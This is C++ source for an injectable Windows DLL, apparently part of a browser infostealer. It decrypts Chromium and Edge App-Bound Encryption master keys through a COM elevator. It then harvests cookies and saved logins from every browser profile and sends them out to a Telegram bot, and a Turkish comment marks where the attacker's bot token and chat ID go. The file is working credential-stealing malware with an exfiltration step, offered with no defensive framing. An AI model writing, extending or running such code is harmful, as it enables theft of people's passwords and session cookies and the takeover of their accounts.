
#include "../core/common.hpp"
#include "../sys/bootstrap.hpp"
#include "../sys/internal_api.hpp"
#include "pipe_client.hpp"
#include "browser_config.hpp"
#include "data_extractor.hpp"
#include "fingerprint.hpp"
#include "../com/elevator.hpp"
#include <fstream>
#include <sstream>

using namespace Payload;

struct ThreadParams {
    HMODULE hModule;
    LPVOID lpPipeName;
};

std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState, const std::string& keyName, std::string* errorMsg = nullptr) {
    std::ifstream f(localState, std::ios::binary);
    if (!f) {
        if (errorMsg) *errorMsg = "Cannot open Local State";
        return {};
    }

    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

    std::string tag = "\"" + keyName + "\":\"";
    size_t pos = content.find(tag);
    if (pos == std::string::npos) {
        if (errorMsg) *errorMsg = "Key not found: " + keyName;
        return {};
    }

    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) {
        if (errorMsg) *errorMsg = "Malformed JSON";
        return {};
    }

    std::string b64 = content.substr(pos, end - pos);

    DWORD size = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    if (size < 5) {
        if (errorMsg) *errorMsg = "Invalid key data (too small)";
        return {};
    }

    std::vector<uint8_t> data(size);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);

    return std::vector<uint8_t>(data.begin() + 4, data.end());
}

std::string KeyToHex(const std::vector<uint8_t>& key) {
    std::string hex;
    for (auto b : key) {
        char buf[3];
        sprintf_s(buf, "%02X", b);
        hex += buf;
    }
    return hex;
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    auto params = std::unique_ptr<ThreadParams>(static_cast<ThreadParams*>(lpParam));
    LPCWSTR pipeName = static_cast<LPCWSTR>(params->lpPipeName);
    HMODULE hModule = params->hModule;

    {
        PipeClient pipe(pipeName);
        if (!pipe.IsValid()) {
            FreeLibraryAndExitThread(hModule, 0);
            return 1;
        }

        try {
            auto config = pipe.ReadConfig();
            auto browser = GetConfigs().at(config.browserType);

            pipe.LogDebug("Running in " + browser.name);

            if (!Sys::InitApi(config.verbose)) {
                pipe.LogDebug("Warning: Syscall initialization failed.");
            }

            std::string error;
            auto encKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "app_bound_encrypted_key", &error);

            if (encKey.empty()) {
                auto legacyKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "encrypted_key");
                if (!legacyKey.empty()) {
                    pipe.Log("NO_ABE:Browser uses legacy DPAPI encryption (App-Bound Encryption not enabled)");
                } else {
                    pipe.Log("NO_ABE:No encryption key found in Local State");
                }
            } else {

            std::vector<uint8_t> masterKey;
            {
                Com::Elevator elevator;
                masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge", browser.name == "Avast");
            }

            pipe.Log("KEY:" + KeyToHex(masterKey));

            if (browser.name == "Edge") {
                auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "aster_app_bound_encrypted_key");
                if (!asterEncKey.empty()) {
                    try {
                        Com::Elevator elevator;
                        auto asterKey = elevator.DecryptKeyEdgeIID(asterEncKey, browser.clsid, browser.iid);
                        pipe.Log("ASTER_KEY:" + KeyToHex(asterKey));
                    } catch (...) {}
                }
            }

            DataExtractor extractor(pipe, masterKey, config.outputPath);

            for (const auto& entry : std::filesystem::directory_iterator(browser.userDataPath)) {
                try {
                    if (entry.is_directory()) {
                        if (std::filesystem::exists(entry.path() / "Network" / "Cookies") ||
                            std::filesystem::exists(entry.path() / "Login Data")) {
                            extractor.ProcessProfile(entry.path(), browser.name);
                        }
                    }
                } catch (...) {}
            }

            // ===== TELEGRAM GÖNDER =====
            // Bot token ve chat ID'yi burada değiştir
            extractor.SendAllToTelegram("BOT_TOKEN", "CHAT_ID");

            if (config.fingerprint) {
                FingerprintExtractor fingerprinter(pipe, browser, config.outputPath);
                fingerprinter.Extract();
            }
            }

        } catch (const std::exception& e) {
            pipe.Log("[-] " + std::string(e.what()));
        }
    }

    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        auto params = new ThreadParams{hModule, lpReserved};
        HANDLE hThread = CreateThread(NULL, 0, PayloadThread, params, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}